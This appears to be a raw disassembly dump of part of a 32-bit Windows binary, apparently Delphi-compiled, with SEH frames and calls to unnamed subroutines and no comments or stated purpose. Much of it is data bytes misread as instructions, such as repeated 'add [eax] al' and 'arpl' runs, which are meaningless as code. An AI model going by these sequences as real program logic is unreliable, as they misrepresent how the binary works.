add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
loope r-xdata
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add ah bl
mov ch 0x46
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax + 0x580046e5 ] bl
mov dh 0x46
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
add [ eax ] bh
add [ eax ] al
xor al 0xb1
inc esi
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] ah
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xe2
push ebp
inc ebp
lea eax [ eax ]
mov ah 0xe1
inc esi
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
add [ eax ] bh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
sub al 0x32
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
movsb [ edi ] [ esi ]
loop r-xdata
dec ecx
dec ebp
jae r-xdata
test [ edx ] dh
inc eax
add [ eax - 0x43ffb91c ] cl
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
lodsd [ esi ]
inc ecx
add ah dl
mov al 0x41
add [ eax ] cl
jmp 0xffffffffe03ae400
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
in al 0xe3
inc esi
push ebp
inc ebp
inc edx
popad
jae r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
fiadd [ ebp ]
push eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
loop r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x1b77ffc0 ] al
inc esi
add [ ebp + esi * 4 + 0x54180046 ] bh
push ebp
inc ebp
push esp
loope r-xdata
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
add [ eax ] al
pop eax
loop r-xdata
lea eax [ eax ]
add al 0xe3
inc esi
add [ edi ] al
sbb [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
jae r-xdata
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x49 ] ch
inc esi
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax - 0x19 ] cl
inc esi
add [ eax ] bl
push esp
dec ecx
dec ebp
jae r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi + ebx * 8 + 0x48500045 ] ch
add [ eax + eax ] dh
add ah ch
mov dl 0x46
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
add al ch
mov cl 0x46
add [ ebx ] al
add [ ecx ] dl
dec ecx
dec ebp
jae r-xdata
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
dec eax
xor al [ eax ]
lodsb [ esi ]
fiadd [ ebp ]
push eax
dec eax
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
dec ecx
popad
inc ebx
outsd
jb r-xdata
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
xor al 0x40
push ebp
inc ebp
inc edx
popad
jae r-xdata
mov ch 0x46
add [ eax ] bl
push esp
inc esi
add [ eax + eax ] al
add [ eax ] al
sbb al 0xb2
inc esi
push ebp
inc ebp
add [ eax ] al
xor al 0xe2
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
add [ esi + ebx * 8 + 0x48500045 ] ch
movsb [ edi ] [ esi ]
loop r-xdata
add [ ebx + esi * 4 + 0x50046 ] bl
adc [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
inc ecx
add ah cl
popad
inc ebx
outsd
jb r-xdata
add [ ebp + ebp * 4 - 0x539fffbf ] dl
lodsb [ esi ]
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
push ebp
inc ebp
add [ eax ] al
mov bl ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jecxz r-xdata
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
lodsd [ esi ]
inc ecx
add [ eax - 0x54 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jecxz r-xdata
sub_46e340
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xe3
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jecxz r-xdata
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
add [ eax ] bh
add [ eax ] al
pop eax
loop r-xdata
inc ecx
add ah dl
mov al 0x41
add [ eax ] cl
jmp 0xffffffffe03ae400
lodsd [ esi ]
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi + ebx * 8 + 0x48500045 ] ch
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
sub_46e41c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
in al 0x46
add [ eax ] cl
add [ eax ] al
add [ esp + esi * 4 ] bl
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x18f7ffc0 ] al
inc esi
add [ esi + esi * 4 + 0x54180046 ] dl
dec ecx
dec ebp
jae r-xdata
dec [ ebx - 0x7b450bbb ]
in eax 0x46
add al ch
out 0x98 eax
stc
inc [ eax + eax * 8 + 0x458d5774 ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
clc
xor edx edx
call sub_4080c0
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404570
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_407ddc
test al al
je r-xdata
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46e56d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x3
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_404570
mov eax [ ebp - 0x8 ]
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_404570
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
test ebx ebx
jle r-xdata
mov ecx esi
mov dl 0x1
mov eax [ sub_46e108 ]
call sub_46b5dc
mov ebx eax
mov esi ebx
lea eax [ esi + 0x68 ]
push eax
mov ecx 0x7fffffff
mov edx 0xb
mov eax [ ebp - 0x4 ]
call sub_404570
mov [ esi + 0x70 ] 0x2
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e574
sub_46e58f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039d0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46b65c
mov eax [ ebp - 0x10 ]
call sub_404310
test eax eax
jle r-xdata
xor eax eax
push ebp
push sub_46e6c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x4d
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46b65c
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_407e14
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_407ddc
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov dl [ edx + 0xaf ]
call sub_404238
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_40445c
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46db24
mov [ ebp - 0xc ] eax
jmp r-xdata
sub al 0x1b
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_407e14
mov eax [ ebp - 0x18 ]
call sub_404310
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e6cd
lea eax [ ebp - 0xc ]
call sub_40d19c
retn
mov ecx esi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x30 ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e058
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_46e708
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b674
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e748
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46e8c6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax ebx
call sub_41664c
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ edi + 0x6c ]
call sub_407f48
push [ ebp - 0xc ]
push r-xdata
push [ edi + 0x68 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4043d0
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov edx eax
mov eax esi
pop ecx
call sub_416890
mov eax [ edi + 0x70 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46e89c
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
call sub_41662c
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jl r-xdata
cmp eax [ esp ]
pop edx
pop eax
jb r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2d
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
push eax
mov ecx r-xdata
pop eax
call sub_40435c
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov edx eax
mov eax esi
pop ecx
call sub_416890
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx + 0x34 ]
call sub_404238
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4043d0
mov eax [ ebp - 0x4 ]
call sub_404310
push eax
lea eax [ ebp - 0x4 ]
call j_sub_40451c
mov edx eax
mov eax esi
pop ecx
call sub_416890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e8a3
lea eax [ ebp - 0x8 ]
call sub_40d19c
retn
jmp r-xdata
sub_46e8ff
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x6e ] ah
add [ fs : ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b768
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e948
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039d0#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e974
retn
sub_46e978
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b5bc
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_46b588
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e708
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_46b734
sub_46e9cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
push ebp
push ebp
inc ebp
add [ edx + ebp * 8 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x16 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x46 ] dl
add [ eax ] bh
add [ eax ] al
pop eax
loop r-xdata
lodsd [ esi ]
inc ecx
add ah dl
mov al 0x41
add [ ebx + ebp * 8 + 0x46 ] dl
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax - 0x19 ] cl
inc esi
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi + ebx * 8 + 0x48500045 ] ch
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
add ah al
xor al 0x40
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ ecx - 0x39748fba ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add al bh
0x80046 0x0
pop eax
inc ebp
lea eax [ eax ]
jo r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
push ebx
push esi
test dl dl
je r-xdata
outsb
outsw
pop eax
pop eax
inc ebp
lea eax [ eax ]
jae r-xdata
dec ebp
inc esi
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b768
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
add esp 0xfffffff0
call sub_4035a0
inc esi
add [ esi + esi * 4 + 0x54180046 ] dl
dec ecx
dec ebp
test [ edx ] dh
inc eax
add [ ebx + ebp * 8 ] dl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x14ebffc0 ] al
fdiv [ eax + eax * 2 ]
pop eax
inc ebp
adc al 0xea
inc esi
add [ eax ] al
jecxz r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ 0x64491100 ] al
dec ebp
jae r-xdata
dec ecx
popad
inc ebx
outsd
jb r-xdata
jae r-xdata
sbb [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
pop eax
inc ebp
add [ eax ] al
sub_46eaac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
0x80046 0x0
sub_46eacc
sbb al 0xb4
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x14ebffc0 ] al
inc esi
add [ esi + esi * 4 + 0x54180046 ] dl
dec ecx
dec ebp
jae r-xdata
add [ ecx - 0x39748fba ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
push ebx
push esi
test dl dl
je r-xdata
outsb
outsw
pop eax
pop eax
inc ebp
lea eax [ eax ]
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b768
mov eax [ r-xdata ]
mov [ esi + 0x70 ] eax
mov eax esi
add esp 0xfffffff0
call sub_4035a0
sub_46eb14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b674
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46eb94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ebb9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ebc0
retn
sub_46ebef
inc [ ebx ]
add [ eax ] al
add [ eax + 0x58 ] bl
inc ebp
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46ec1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec24
retn
sub_46ec30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ec55
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec5c
retn
sub_46ec6c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xec
inc esi
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + esi * 8 + 0x540f0046 ] ch
dec ecx
dec ebp
dec ecx
dec ebp
inc ebp
inc edx
outsd
jne r-xdata
inc esi
popad
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
or eax [ ebx + 0x6f ]
popad
push eax
popad
jb r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
and [ eax ] al
add [ eax ] al
outsd
inc eax
add [ eax ] bh
add [ eax ] al
add [ esi ] cl
push esp
dec ecx
dec ebp
jae r-xdata
add [ eax + eax ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] ch
adc ch ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in eax dx
inc esi
add [ eax + 0x46ed ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x13 ] ch
inc esi
add [ eax + eax ] bh
add [ eax ] al
pushfd
sbb eax 0x34c40041
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al bl
inc esi
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ eax + 0x680046f2 ] al
dec ebx
inc ecx
add [ eax + 0x4c ] cl
inc ecx
add [ eax + 0x4c ] bh
inc ecx
add [ eax + 0x4c ] dh
inc ecx
add [ eax ] bl
inc esi
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500046f5 ] ah
outsb
je r-xdata
outsb
je r-xdata
lea eax [ eax ]
sub ch 0x46
add ah al
in al dx
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
jns r-xdata
add bh bh
fdiv st4
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x450c0002 ] al
popad
push eax
popad
jb r-xdata
dec eax
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add al ch
hlt
xor al [ eax ]
mov al [ 0x500046f5 ]
enter 0x469f 0x0
and al 0x0
sbb bl dh
inc esi
jb r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or al 0x45
adc ch ch
inc esi
add [ eax ] ch
push ds
inc ecx
add [ ebx ] al
add [ ecx ] cl
dec ecx
dec ebp
jae r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
fdiv st6
inc esi
add [ eax + 0x48 ] dl
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] ch
add [ eax ] al
outsd
inc eax
add [ eax + 0x4b ] ch
inc ecx
add [ eax + 0x4c ] cl
inc ecx
add [ eax + 0x4c ] bh
inc ecx
add [ eax + 0x4c ] dh
inc ecx
add [ eax ] bl
inc esi
dec eax
popad
jb r-xdata
popad
add eax [ gs : bx + si ]
lodsb [ esi ]
adc [ eax ] al
adc ah dh
inc esi
add [ esp + esi * 8 + 0x46 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430f0000 ] al
outsd
outsb
je r-xdata
dec ebp
jae r-xdata
pop eax
out dx eax
inc esi
add [ edi ] al
pop es
push esp
dec ecx
push esp
js r-xdata
out dx al
inc esi
add [ edi ] al
or eax 0x41644954
je r-xdata
add [ eax ] cl
add [ eax ] al
or eax 0x41644954
je r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
inc eax
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] ah
lea eax [ eax ]
insb
out dx al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 - 0x1147ffba ] cl
inc esi
add [ eax ] al
outsb
je r-xdata
nop
popad
inc ebp
js r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xf0
sub al 0xef
inc esi
add [ ebp + ebp * 8 + 0x46 ] bh
add [ ebx ] al
add [ ecx ] cl
dec ecx
dec ebp
jae r-xdata
inc esi
add [ eax + 0x4b ] ch
inc ecx
add [ eax + 0x4c ] cl
inc ecx
add [ eax + 0x4c ] bh
inc ecx
add [ eax + 0x4c ] dh
inc ecx
add [ eax ] bl
inc esi
xor al 0xf6
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
jae r-xdata
jo r-xdata
inc esi
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 8 ] ah
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451a0040 ] al
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ gs : bx + si ] al
nop
out dx al
inc esi
add [ ebp + ebp * 8 + 0x46 ] bh
add [ ebx ] al
add [ ecx ] cl
dec ecx
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c0046ee ] ah
add [ eax ] al
mov esi gs
inc esi
add [ eax + 0x46ee ] bh
outsb
jae r-xdata
add [ ebx + 0x56 ] dl
call sub_403608
popad
push eax
popad
jb r-xdata
inc ecx
outsb
jae r-xdata
insb
je sub_46f0dc
jb r-xdata
add [ edi ] al
push esp
dec ecx
push esp
js r-xdata
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add [ esi + esi * 8 ] dh
popad
add [ gs : bx + si ] al
lea eax [ eax ]
sub al 0xef
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x11 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x46 ] cl
add [ eax + eax ] al
add ah al
in al dx
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al bl
test [ esi ] 0x50
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
out dx al
inc esi
add [ eax + eax ] cl
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov ebx edx
mov eax esi
call sub_403284
test bl bl
jle r-xdata
jb r-xdata
add [ fs : eax ] al
add [ eax ] al
outsb
popad
je r-xdata
add [ edi ] al
push cs
push esp
dec ecx
dec ebp
jae r-xdata
in eax dx
inc esi
adc [ eax ] al
dec esp
hlt
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403294
mov edx ebx
and dl 0xfc
add [ fs : eax ] al
add bh bh
